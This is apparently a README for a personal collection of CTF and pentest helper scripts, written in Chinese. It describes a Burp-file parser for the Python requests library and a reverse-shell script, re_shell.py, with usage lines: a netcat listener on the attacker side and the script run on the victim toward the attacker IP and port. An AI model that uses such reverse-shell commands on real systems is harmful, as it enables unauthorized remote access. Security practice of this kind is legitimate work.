# Scripts
some scripts

## ctfs

更方便使用 requests 库进行web测试

* 模块功能：

```
1. 解析 burp 文件， 返回相应参数， 可传递给 requests
2. header
``` 

## shell

### python

* re_shell.py

> 反弹shell

```
# attack
nc -lvp attack_port 

# victim
python re_shell.py attack_ip attack_port
```